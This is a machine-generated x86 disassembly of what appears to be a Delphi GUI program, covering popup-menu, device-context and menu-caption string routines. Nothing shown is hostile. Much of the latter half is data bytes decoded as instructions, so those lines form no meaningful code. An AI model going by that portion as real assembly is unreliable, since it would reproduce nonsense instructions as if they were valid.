mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_435ba4
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458d5c
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4137ac
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_44bc9c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4137ac
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_44bc9c
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4137ac
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4137ac
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_44bc9c
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4137ac
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4137ac
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_44bccc
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4137ac
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4137ac
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_44bccc
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_458a00
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_458a68
jmp r-xdata
sub_44ce37
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_44cef0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_413650
pop esi
pop ebx
retn
push ebx
push sub_44c960
call sub_41a2ac
mov [ ebx + 0x10 ] eax
sub_44cf34
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44bab4
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_44cef0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_44cfa8
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_44cf18
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44bb50
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_44d000
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_447e4c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_44c7bc
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44c7bc
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_44d048
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_447e4c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4575ac
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403454
mov edx eax
jmp r-xdata
sub_44d094
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_412350
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_44d000
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_44b408
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_44b904
mov eax [ ebx + 0x34 ]
call sub_448cac
mov eax ebx
call sub_44c2ac
mov eax ebx
call sub_44d048
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_448ddc
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44d148
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4137ac
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4137ac
cmp ebp [ eax ]
jne r-xdata
sub_44d184
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41c9b0
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_41c1e4
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_41c9b0
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_41c1e4
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403454
mov edx [ r-xdata ]
call sub_4033e4
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41c9b0
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_41c1e4
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_44d26c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403fe4
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_404250
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_4044f0
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_404250
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_4044f0
jmp r-xdata
sub_44d300
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403f90
mov ebx 0x1
mov eax esi
call sub_404250
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404178
sub_44d364
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44d3bd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44d26c
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_44d26c
mov eax [ ebp - 0x8 ]
pop edx
call sub_407c1c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d3c4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fb4
retn
sub_44d3d7
add ah al
jl r-xdata
jl r-xdata
add [ eax + 0x7f ] dl
inc esi
add al al
jl r-xdata
inc esp
add [ edi + edi * 8 + 0x30 ] ah
add al dl
jl r-xdata
add [ eax ] cl
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
call sub_403258
mov eax [ rw-data ]
call sub_403258
inc [ rw-data ]
jne r-xdata
xor [ ecx + ecx * 4 + 0x20 ] ah
add [ esp + edi * 2 - 0x7dc3ffba ] bl
inc esi
add [ eax + 0x400467c ] bl
add [ esi ] 0x94
jl r-xdata
add [ edx + eax * 4 ] bh
add [ esi ] 0x98
jl r-xdata
add [ esp + edi * 2 + 0x7f380046 ] bh
inc esi
add [ eax - 0x3ffb984 ] bh
add [ esi ] rw-data
inc eax
jg r-xdata
sti
jmp [ ecx + rw-data ]
add al cl
add [ esi ] 0x90
jl r-xdata
add [ edx + eax * 4 ] al
inc esi
add [ esp + edi * 2 - 0x7d37ffba ] dl
inc esi
add [ eax - 0x67ffb984 ] dl
add [ esi ] 0x8c
add [ eax - 0x5fffb984 ] dh
add [ esi ] 0xac
jl r-xdata

jl r-xdata
add [ eax - 0x73ffb97e ] bl
mov eax rw-data
mov ecx 0x12
add al ch
rcr [ ebp - 0x5 ] 0xff
add al ah
jg r-xdata
jl r-xdata
add [ eax + eax * 4 ] bl
inc esi
add [ eax + 0x7c00467c ] ch
add [ esi ] 0xa4
jl r-xdata
sti
add [ eax - 0xbffb984 ] cl
jl r-xdata
jg r-xdata
add ah dh
mov [ fs : eax ] esp
mov ebp esp
jg r-xdata
add [ eax - 0x7e ] bh
inc esi
add [ eax - 0x2fffb984 ] ah
mov edx [ r-xdata ]
call sub_404a0c
mov eax rw-data
call sub_403f90
adc al [ eax ]
add [ eax ] al
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
add [ esp + edi * 2 - 0x7fcfffba ] al
inc esi
add [ ebp - 0x75 ] dl
in al dx
sti
jmp [ ecx + r-xdata ]
add [ ecx + 0x12 ] bh
sub_44d69e
in al dx
clc
inc esp
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
[ ecx + eax + 0x1b00045 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
add [ eax ] al
[ 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
call [ eax ]
add [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
push esp
add [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
push [ eax + eax ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ esp + esi - 0x6defffc0 ] dl
inc ecx
add [ esp + esi - 0x325fffc0 ] bl
inc ebx
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x4 ] ah
inc ebp
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + ebx * 8 ] cl
inc esp
add [ eax ] cl
ja r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
inc ebx
add al bh
lodsb [ esi ]
inc ebx
add [ eax ] dl
mov [ ebx ] al
dec eax
jle r-xdata
add [ edx + esi * 4 ] bl
inc ebx
add [ eax ] ch
mov [ ebx ] al
call 0xffffffffbc451a59
xchg ebp eax
inc ecx
add [ ebp + edx * 4 - 0x670fffbf ] dh
inc ebx
add [ eax - 0x3b ] ch
inc ebx
add [ eax + 0x3d ] dl
inc ecx
add ah bh
stosb [ edi ]
inc ebx
add [ eax ] dl
jg r-xdata
std
dec esi
outsd
jb r-xdata
outsd
insb
outsd
jb r-xdata
inc ebx
add [ edi + eax * 8 + 0x43 ] ah
add [ esi + eax * 8 ] bl
inc ebx
add ah al
lds eax [ ebx ]
cmp al 0xf2
inc ebx
add [ eax + edx * 8 ] cl
inc ebx
add [ eax ] dh
add al 0x44
add [ eax - 0x57ffbc12 ] bh
int1
inc ebx
add [ eax + 0x7bc0045 ] cl
inc ebp
add al dh
or [ ebp ] eax
push es
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
push esp
or [ ebp ] eax
ror [ edx ] 0x1
inc ebp
add ah dh
or al [ ebp ]
mov [ ebx ] cl
inc ebp
add ah cl
or [ ebp ] eax
sub al 0x5
inc ebp
add [ esp + edx * 2 ] dl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
add [ ecx + ecx * 4 - 0x76ebffbd ] bl
inc ebx
add [ eax ] ch
mov [ ebx ] es
aam 0x8a
inc ebx
add [ esp + ecx * 8 ] bh
inc ebx
add [ ebp + ebp * 4 + 0x43 ] bh
add [ eax + esi * 8 + 0x43 ] bl
add [ eax ] bl
int1
inc ebx
add [ esp + ebp * 8 ] dl
inc ebx
add ah bh
add [ eax - 0x3 ] al
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
add [ gs : eax ] dl
add eax 0x676e6152
adc [ eax ] al
or al 0x0
add bh bh
dec esp
add [ ebp ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0x6f500800
jae r-xdata
push esi
jb r-xdata
outsd
insb
nop
mov ah 0xd9
inc esp
add [ edi ] al
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
adc [ edi + 0x43 ] bh
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
[ ecx + eax + 0x45 ]
add [ eax ] al
je r-xdata
add [ ebx ] al
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jb r-xdata
outsd
insb
mov al [ 0xffffffffc00044d8 ]
dec esi
inc ebx
add [ 0x6f460500 ] cl
jb r-xdata
inc ecx
add al ch
add eax [ ebp ]
push esp
clc
inc ebx
add [ eax - 0x3 ] dh
inc ebx
add [ esp + edi * 8 + 0x7d840043 ] bh
inc ebx
add al dl
inc ebx
add al dh
inc ebx
add [ eax ] cl
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
jae r-xdata
call [ ecx + eax + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsd
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
jb r-xdata
insb
or ah [ gs : edx + 0x73 ]
push ebx
fiadd [ eax + eax + 0x3 ]
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
jb r-xdata
je r-xdata
add [ 0x2c000000 ] al
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
mov esp 0x1004501
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax ] dl
fadd [ eax + eax + 0x3 ]
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
shl [ eax + 0x44d8 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0xd9
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 8 + 0x44 ] dh
add [ edx + 0x1c0044d9 ] bl
add al [ eax ]
add [ ebx + ecx * 2 ] cl
inc ebx
add al dl
cwde
inc ecx
add [ ebx ] al
add [ eax ] al
add [ eax - 0x25 ] dh
inc esp
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
dec eax
outsd
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + ebx * 8 ] ch
inc esp
add [ 0x6d726f46 ] al
inc edx
outsd
jb r-xdata
inc eax
add [ ecx ] al
jae r-xdata
outsd
imul ebx [ eax + 0x100411f ] 0xffffffa5
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
lea eax [ eax ]
rcr dl 0x44
add [ edi ] cl
insb
add [ gs : eax ] eax
add [ eax ] al
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
jae r-xdata
salc
inc esp
add [ eax ] cl
add al [ eax ]
jmp [ esi + eax + 0x10045 ]
add [ esi + edx * 8 ] ah
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp - 0x24dbffc0 ]
add bh bh
insd
adc al 0x11
inc esp
add [ ebx ] al
lea eax [ eax ]
and al 0xdb
insb
inc esi
invd
dec ecx
dec edi
add bh bh
dec [ ebx + 0x44daf4c0 ]
add [ edi ] cl
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
fiadd [ eax + eax + 0x6 ]
bound esi [ ebx + 0x4e ]
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
add eax 0x2c000000
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
inc eax
add al al
fiadd [ eax + eax + 0xf ]
jb r-xdata
or al 0x54
inc edx
outsd
jb r-xdata
fiadd [ eax + eax + 0x3 ]
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc eax
add [ ebx + ebx * 8 + 0x44 ] dh
push cs
jo r-xdata
mov eax eax
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] ah
fild [ eax + eax + 0x8 ]
jae r-xdata
push eax
outsd
jb r-xdata
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
je r-xdata
inc esp
popa
jne r-xdata
insb
jns r-xdata
jae r-xdata
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
outsd
jb r-xdata
inc esp
add [ ecx ] cl
insd
inc esp
jae r-xdata
add [ eax ] al
add [ esp + ebx * 8 + 0x44 ] dh
je r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
rol ah 0xdb
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add al bl
fild [ eax + eax + 0xa ]
jo r-xdata
jb r-xdata
push es
add eax 0x6d726f46
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
add [ eax ] al
enter 0x44dc 0x0
push es
jae r-xdata
je r-xdata
je r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
popad
dec ebp
je r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
insd
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
jo r-xdata
fadd [ eax + eax + 0x6 ]
inc eax
add [ ebp + ebx * 8 + 0x44 ] bl
add [ eax ] cl
fadd [ eax + eax + 0x3 ]
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
outsd
arpl [ ecx + 0x4e ] sp
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
adc ch bl
inc esp
add [ esi ] al
inc esp
jae r-xdata
or edx [ ebx + eax * 2 + 0x6c ]
pop esp
dec esi
outsd
outsb
push cs
jo r-xdata
push cs
jne r-xdata
fadd [ eax + eax + 0x3 ]
inc esi
outsd
jb r-xdata
jae r-xdata
je r-xdata
jb r-xdata
jo r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
js r-xdata
je r-xdata
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al cl
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
inc esi
jae r-xdata
fild [ eax + eax - 0x70 ]
fcomp st3
inc esp
add [ ebx ] al
jo r-xdata
inc ebx
insb
outsd
inc ebp
jbe r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add ah dh
adc [ eax ] al
adc ch bl
inc esp
add [ ebp - 0x225fffc0 ] cl
inc esp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
adc al 0xdd
inc esp
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
inc esp
add [ esi ] al
or al 0x54
jns r-xdata
popad
je r-xdata
inc esi
outsd
jb r-xdata
andps xmm0 [ ebp + 0x66 ]
inc esp
add [ ebx ] al
push esp
push eax
dec edi
ja r-xdata
outsb
je r-xdata
jb r-xdata
bound ebp [ ecx + 0x48 ]
push es
inc esp
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
outsb
push esp
outsd
jo r-xdata
outsd
jae r-xdata
inc esi
outsd
jb r-xdata
outsb
je r-xdata
inc ebx
jb r-xdata
add [ eax ] al
add [ eax ] dl
fld [ eax + eax + 0x6 ]
inc esi
push esp
fadd [ eax + eax - 0x30 ]
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x213bffc0 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5c0044df ] bh
loope r-xdata
add cl [ eax ]
push es
add [ eax - 0x43ffbaef ] al
adc [ ebp ] eax
enter 0x4512 0x0
sub [ eax - 0x6717ffbd ] cl
add [ eax ] al
add [ eax ] al
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
jbe r-xdata
popad
outsb
